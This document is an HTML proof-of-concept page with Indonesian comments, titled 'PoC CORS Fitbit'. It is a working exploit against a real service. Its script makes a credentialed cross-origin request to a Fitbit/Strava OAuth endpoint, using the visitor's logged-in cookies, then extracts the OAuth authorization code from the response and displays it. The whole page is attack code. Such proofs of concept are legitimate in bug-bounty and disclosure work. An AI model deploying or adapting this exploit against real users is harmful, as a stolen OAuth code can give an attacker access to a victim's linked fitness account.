<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC CORS Fitbit</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 2em;
    }
    .log {
      margin-top: 1em;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h2>Ambil kode OAuth dari strava.fitbit.com</h2>
  <div id="result" class="log">⏳ Sedang mengambil kode...</div>

  <script>
    const url = "https://strava.fitbit.com/auth/fitbit";

    fetch(url, {
      method: "GET",
      credentials: "include", // penting untuk bawa cookie login Fitbit
      mode: "cors", // biar kena CORS
      headers: {
        "Origin": "https://admin-sub.github.io"
      }
    })
    .then(response => {
      if (!response.ok) {
        throw new Error("Respon tidak OK: " + response.status);
      }
      return response.text();
    })
    .then(html => {
      // cari kode OAuth di meta refresh redirect
      const match = html.match(/code=([\w-]+)/);
      if (match && match[1]) {
        const code = match[1];
        document.getElementById("result").textContent = "✅ Kode berhasil diambil: " + code;
        console.log("OAuth code:", code);
      } else {
        document.getElementById("result").textContent = "❌ Kode tidak ditemukan di response.";
        console.log("Response body:", html);
      }
    })
    .catch(error => {
      document.getElementById("result").textContent = "❌ ERROR: " + error;
      console.error("Fetch error:", error);
    });
  </script>
</body>
</html>

